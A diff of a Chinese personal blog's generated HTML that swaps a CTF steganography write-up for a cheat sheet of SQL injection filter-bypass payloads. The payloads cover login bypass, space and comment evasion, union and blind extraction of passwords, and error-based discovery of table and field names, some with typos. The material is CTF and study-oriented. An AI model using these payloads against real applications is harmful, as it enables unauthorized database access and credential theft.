@@ -77,7 +77,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="misc," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -93,26 +93,17 @@
 
 
 
-<meta name="description" content="misc:flag.png给了一张png图">
-<meta name="keywords" content="misc">
+<meta name="description" content="总结下sql常见的bypass方式">
+<meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hbctf第十场writeup">
-<meta property="og:url" content="http://Merl1ng.com/2017/08/19/hbctf第十场writeup/index.html">
+<meta property="og:title" content="sqlbypass小结">
+<meta property="og:url" content="http://Merl1ng.com/2018/08/18/sqlbypass小结/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
-<meta property="og:description" content="misc:flag.png给了一张png图">
-<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/10writeup0.png?imageView2/2/w/600/h/400/q/75|imageslim">
-<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/10writeup1.PNG">
-<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/10wrieup2.PNG">
-<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/10writeup3.png?imageView2/2/w/600/h/400/q/75|imageslim">
-<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/10writrip4.PNG">
-<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/10writeup5.PNG?imageView2/2/w/600/h/400/q/75">
-<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/10writeup6.PNG">
-<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/10writeup7.PNG?imageView2/2/w/600/h/400/q/75">
-<meta property="og:updated_time" content="2017-08-31T02:44:36.085Z">
+<meta property="og:description" content="总结下sql常见的bypass方式">
+<meta property="og:updated_time" content="2018-08-18T13:03:56.344Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hbctf第十场writeup">
-<meta name="twitter:description" content="misc:flag.png给了一张png图">
-<meta name="twitter:image" content="http://otvzfr1o1.bkt.clouddn.com/10writeup0.png?imageView2/2/w/600/h/400/q/75|imageslim">
+<meta name="twitter:title" content="sqlbypass小结">
+<meta name="twitter:description" content="总结下sql常见的bypass方式">
 
 
 
@@ -140,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://Merl1ng.com/2017/08/19/hbctf第十场writeup/"/>
+  <link rel="canonical" href="http://Merl1ng.com/2018/08/18/sqlbypass小结/"/>
 
 
 
 
 
-  <title>hbctf第十场writeup | Merl1ng's blog</title>
+  <title>sqlbypass小结 | Merl1ng's blog</title>
   
 
 
@@ -275,7 +266,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/08/19/hbctf第十场writeup/">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2018/08/18/sqlbypass小结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Merl1ng">
@@ -292,7 +283,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">hbctf第十场writeup</h1>
+          <h1 class="post-title" itemprop="name headline">sqlbypass小结</h1>
         
 
         <div class="post-meta">
@@ -304,8 +295,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-19T17:49:10+08:00">
-                2017-08-19
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-18T19:00:16+08:00">
+                2018-08-18
               </time>
             
 
@@ -314,28 +305,6 @@
             
           </span>
 
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/writeup/" itemprop="url" rel="index">
-                    <span itemprop="name">writeup</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -361,29 +330,57 @@
       
 
       
-        <h3 id="misc-flag-png"><a href="#misc-flag-png" class="headerlink" title="misc:flag.png"></a>misc:flag.png</h3><p>给了一张png图<br><a id="more"></a><br><img src="http://otvzfr1o1.bkt.clouddn.com/10writeup0.png?imageView2/2/w/600/h/400/q/75|imageslim" alt=""></p>
-<p>winhex看看 png 头 </p>
-<p>再用 binwalk 也没看出来什么 虽然有zlib 但是由于png图片主体是由zlib压缩的 并不能直接确定<br>(大多数情况下先忽略zlib)</p>
-<p><em>当然这玩意也偶尔有用… 这时用脚本解压</em></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from PIL import Image</div><div class="line">from zlib import *</div><div class="line"> </div><div class="line">data = open(<span class="string">'xxx.PNG'</span>,<span class="string">'rb'</span>).read()[0x15AFFB:]</div><div class="line">data = decompress(data)</div><div class="line"> </div><div class="line">img = Image.new(<span class="string">'1'</span>, (25,25))</div><div class="line">d = img.load()</div><div class="line"> </div><div class="line"><span class="keyword">for</span> n,i <span class="keyword">in</span> enumerate(data):</div><div class="line">    d[(n%25,n/25)] = int(i)*255</div><div class="line"> </div><div class="line">f = open(<span class="string">'1.png'</span>,<span class="string">'wb'</span>)</div><div class="line">img.save(f)</div></pre></td></tr></table></figure>
-<p>回到此题<br>猜测 lsb隐写 放到stegslove </p>
-<p>先试试左右箭头查看RGB无果后<br>选择 analyse    Data extract<br><img src="http://otvzfr1o1.bkt.clouddn.com/10writeup1.PNG" alt=""><br>按照图示选择save bin 再次放到winhex 显示 pk头<br><img src="http://otvzfr1o1.bkt.clouddn.com/10wrieup2.PNG" alt=""></p>
-<p>改后缀好压可以直接解压 得到 flag的后半部分</p>
-<p><img src="http://otvzfr1o1.bkt.clouddn.com/10writeup3.png?imageView2/2/w/600/h/400/q/75|imageslim" alt=""><br>如果用的是winrar直接解压会报错 需要先点击修复选项 </p>
-<p>接下来寻找flag前半部分 利用后半部分的图片<br>尝试lsb 这次明显不是<br>再次binwalk (lsb得到的图片也叫 flag.png)<br><img src="http://otvzfr1o1.bkt.clouddn.com/10writrip4.PNG" alt=""><br>发现其实有两个png图片<br>用 binwalk “-D=png” flag.png<br>得到flag前半部分 </p>
-<p><img src="http://otvzfr1o1.bkt.clouddn.com/10writeup5.PNG?imageView2/2/w/600/h/400/q/75" alt=""></p>
-<h4 id="补充一道类似的lsb隐写题目"><a href="#补充一道类似的lsb隐写题目" class="headerlink" title="补充一道类似的lsb隐写题目"></a>补充一道类似的lsb隐写题目</h4><p>拿到一张图 lsb隐写<br>同样 save bin 但是这次显示的是 pt头<br><img src="http://otvzfr1o1.bkt.clouddn.com/10writeup6.PNG" alt=""></p>
-<p>这时我们使用一个github上一个工具来处理-cloacked-pixe</p>
-<p>然后使用命令python lsb.py extract 1.png 1.txt 123456可以得到隐写的文件1.txt。<br>ps:extract指的是提取 1.png指的是导入文件名 （用原图）<br>1.txt指的是导出文件名 123456指的是密码（此处根据题目的提示弱密码猜测）</p>
-<p>具体参考 <a href="http://blog.csdn.net/fuzz_nancheng/article/details/53384353?locationNum=4&amp;fps=1" target="_blank" rel="external">http://blog.csdn.net/fuzz_nancheng/article/details/53384353?locationNum=4&amp;fps=1</a></p>
-<h4 id="再补一个lsb的知识点"><a href="#再补一个lsb的知识点" class="headerlink" title="再补一个lsb的知识点"></a>再补一个lsb的知识点</h4><p>如果所给图片格式不为png 比如是bmp等等<br>这时在stegslove左右箭头查看RGB可能没有东西</p>
-<p>可以先扔ps另存png</p>
-<p>再用stegslove查看</p>
-<p>没准就能看到</p>
-<h3 id="forensics-listen"><a href="#forensics-listen" class="headerlink" title="forensics:listen"></a>forensics:listen</h3><p>音频隐写题目</p>
-<p>winhex打开文件头是 riff 搜了一下可能是 wav文件 结合题目listen 将后缀改为 wav<br>听了一下贼刺耳<br>又搜到 可能是音频倒放<br>专门去下载了 Adobe Audition 倒放了一下试试 结果啥都没<br><img src="http://otvzfr1o1.bkt.clouddn.com/10writeup7.PNG?imageView2/2/w/600/h/400/q/75" alt=""></p>
-<p>正确解法<br>去kail<br><code>sox -t wav transmission  -esigned-integer -b16 -r 22050 -t raw - | multimon-ng -A –</code><br>得到flag</p>
-<p>出题人给的生成方法 ./ax25beacon -s “WDPX01” -o transmission – 37.780963 -122.392227 0 </p>
+        <p>总结下sql常见的bypass方式<br><a id="more"></a></p>
+<h3 id="最普通"><a href="#最普通" class="headerlink" title="最普通"></a>最普通</h3><p>username=admin’#</p>
+<h3 id="在’’内"><a href="#在’’内" class="headerlink" title="在’’内"></a>在’’内</h3><p>上面会变成’admin’’ gg</p>
+<p>username=admin’ or 1#<br>这样变成<br>‘admin’ or 1#’</p>
+<h3 id="过滤了-–"><a href="#过滤了-–" class="headerlink" title="过滤了 # – ="></a>过滤了 # – =</h3><p>username=admin’ or ‘a’ like ‘a</p>
+<h3 id="sql-select-from-users-where-username-’-username’-and-password-‘-password’"><a href="#sql-select-from-users-where-username-’-username’-and-password-‘-password’" class="headerlink" title="$sql = select * from users where username=’$username’ and password = ‘$password’"></a>$sql = select * from users where username=’$username’ and password = ‘$password’</h3><p>username = 1’ or 1 or ‘<br>password = 1</p>
+<p>变成 </p>
+<p>select * from users where username=’1’ or 1 or ‘’ and password = ‘1’</p>
+<h3 id="联合"><a href="#联合" class="headerlink" title="联合"></a>联合</h3><p>username = 1’ union select 1,2#</p>
+<h4 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h4><p>用%09%0A %0B %0C %0D %A0 %20 /**/绕过</p>
+<h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><p><code>#， --+， /*xxx*/， /*!xxx*/， /*!50000xxx*/</code></p>
+<p>高阶玩法还可以嵌套使用</p>
+<p>比如只需利用一个<code>*/</code>闭合多个<code>/*!</code></p>
+<h4 id="and-1-1-测不出"><a href="#and-1-1-测不出" class="headerlink" title="and 1=1 测不出"></a>and 1=1 测不出</h4><p>  +，-，*，%，/，&lt;&lt;，&gt;&gt;，||，|，&amp;，&amp;&amp;，也可以将and换成or，&amp;&amp;， ||等</p>
+<p>也可以不使用and或者or，直接使用异或截断：</p>
+<p> 1^1^0，1^0^0</p>
+<h4 id="有"><a href="#有" class="headerlink" title="有 -"></a>有 -</h4><p>admin’-1-‘</p>
+<p>admin’-0-‘</p>
+<h4 id="看见了这个-1’-lt-0e0union-select-1-2-3"><a href="#看见了这个-1’-lt-0e0union-select-1-2-3" class="headerlink" title="看见了这个 1’&lt;0e0union select 1,2,3"></a>看见了这个 1’&lt;0e0union select 1,2,3</h4><h4 id="过滤-substr"><a href="#过滤-substr" class="headerlink" title="过滤 substr"></a>过滤 substr</h4><p>ascii(mid(REVERSE(MID((passwd)from(-%d)))from(-1)))=%d</p>
+<h4 id="过滤-逗号"><a href="#过滤-逗号" class="headerlink" title="过滤 逗号"></a>过滤 逗号</h4><p>union select 1,2,3</p>
+<p>union select * from (select 1)a join (select 2)b join (select 3)c</p>
+<h4 id="已知表名但不知道字段名且过滤information-schema或者直接过滤了字段名"><a href="#已知表名但不知道字段名且过滤information-schema或者直接过滤了字段名" class="headerlink" title="已知表名但不知道字段名且过滤information_schema或者直接过滤了字段名"></a>已知表名但不知道字段名且过滤information_schema或者直接过滤了字段名</h4><p>union select (select i.1 from (select 1,2,3 union select * from user)i limit 0,1),2,3</p>
+<p>union select (select i.1 from (select 1,2,3 union select * from user)i limit 1,1),2,3</p>
+<p>union select 1,(select i.2 from (select 1,2,3 union select * from user)i limit 0,1),3</p>
+<p>union select 1,(select i.2 from (select 1,2,3 union select * from user)i limit 1,1),3</p>
+<p>原理是把不知道的字段名改成1,2,3…好像叫什么虚表</p>
+<p>还可以用order by盲注的方法</p>
+<p>union select 1,0x31,3 order by 3</p>
+<p>union select 1,0x3132,3 order by 3</p>
+<p>…</p>
+<h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤()"></a>过滤()</h4><p>就是 substr() ascii()这种都gg</p>
+<p>使用 Like和regexp</p>
+<p>union select 1,2,3 from user where password regexp ‘^1.*$’</p>
+<p>union select 1,2,3 from user where password regexp ‘^12.*$’</p>
+<p>union select 1,2,3 from user where password like ‘1%’</p>
+<h4 id="过滤information-schema，SCHEMATA，TABLES，COLUMNS"><a href="#过滤information-schema，SCHEMATA，TABLES，COLUMNS" class="headerlink" title="过滤information_schema，SCHEMATA，TABLES，COLUMNS"></a>过滤information_schema，SCHEMATA，TABLES，COLUMNS</h4><p>知道表名想爆库名 直接随便打个函数 比如</p>
+<p>?id=aaa()</p>
+<p>原理就是当一个库中不存在的自定义函数他就会爆出当前库中没有此函数 </p>
+<p>爆表名</p>
+<p>Polygon和linestring</p>
+<p>?id=1 and Polygon(id)</p>
+<p>?id=1 and linestring(id)</p>
+<p>爆字段名</p>
+<p>用using逐个爆破</p>
+<p>首先知道id这个字段 (就问号前面的) 即使不知道也能爆其实</p>
+<p>1 and (selecr <em> from (select </em> from user as ajoin user as b using(id)) as c)</p>
+<p>比如这时爆出了 username</p>
+<p>1 and (selecr <em> from (select </em> from user as ajoin user as b using(id，username)) as c)</p>
+<p>…</p>
+<p>原理就是在使用别名的时候，表中不能出现相同的字段名，否则就会报错，从而爆出字段名，在使用using函数依次爆出其他字段名</p>
+<p>参考<br><a href="https://mp.weixin.qq.com/s/fSBZPkO0-HNYfLgmYWJKCg" target="_blank" rel="external">https://mp.weixin.qq.com/s/fSBZPkO0-HNYfLgmYWJKCg</a></p>
 
       
     </div>
@@ -411,12 +408,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/misc/" rel="tag"><i class="fa fa-tag"></i> misc</a>
-          
-        </div>
-      
 
       
       
@@ -426,18 +417,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/08/21/这些年遇到的隐写题/" rel="next" title="这些年遇到的隐写题">
-                <i class="fa fa-chevron-left"></i> 这些年遇到的隐写题
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/08/13/php弱匹配和json/" rel="prev" title="php弱匹配和json">
-                php弱匹配和json <i class="fa fa-chevron-right"></i>
+              <a href="/2018/08/18/琐碎知识点记录/" rel="prev" title="琐碎知识点记录">
+                琐碎知识点记录 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -588,7 +575,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-flag-png"><span class="nav-number">1.</span> <span class="nav-text">misc:flag.png</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#补充一道类似的lsb隐写题目"><span class="nav-number">1.1.</span> <span class="nav-text">补充一道类似的lsb隐写题目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#再补一个lsb的知识点"><span class="nav-number">1.2.</span> <span class="nav-text">再补一个lsb的知识点</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#forensics-listen"><span class="nav-number">2.</span> <span class="nav-text">forensics:listen</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#最普通"><span class="nav-number">1.</span> <span class="nav-text">最普通</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在’’内"><span class="nav-number">2.</span> <span class="nav-text">在’’内</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤了-–"><span class="nav-number">3.</span> <span class="nav-text">过滤了 # – =</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql-select-from-users-where-username-’-username’-and-password-‘-password’"><span class="nav-number">4.</span> <span class="nav-text">$sql = select * from users where username=’$username’ and password = ‘$password’</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#联合"><span class="nav-number">5.</span> <span class="nav-text">联合</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#空格被过滤"><span class="nav-number">5.1.</span> <span class="nav-text">空格被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注释符"><span class="nav-number">5.2.</span> <span class="nav-text">注释符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#and-1-1-测不出"><span class="nav-number">5.3.</span> <span class="nav-text">and 1=1 测不出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#有"><span class="nav-number">5.4.</span> <span class="nav-text">有 -</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#看见了这个-1’-lt-0e0union-select-1-2-3"><span class="nav-number">5.5.</span> <span class="nav-text">看见了这个 1’<0e0union select 1,2,3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤-substr"><span class="nav-number">5.6.</span> <span class="nav-text">过滤 substr</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤-逗号"><span class="nav-number">5.7.</span> <span class="nav-text">过滤 逗号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#已知表名但不知道字段名且过滤information-schema或者直接过滤了字段名"><span class="nav-number">5.8.</span> <span class="nav-text">已知表名但不知道字段名且过滤information_schema或者直接过滤了字段名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤"><span class="nav-number">5.9.</span> <span class="nav-text">过滤()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤information-schema，SCHEMATA，TABLES，COLUMNS"><span class="nav-number">5.10.</span> <span class="nav-text">过滤information_schema，SCHEMATA，TABLES，COLUMNS</span></a></li></ol></li></ol></div>
             
 
           </div>
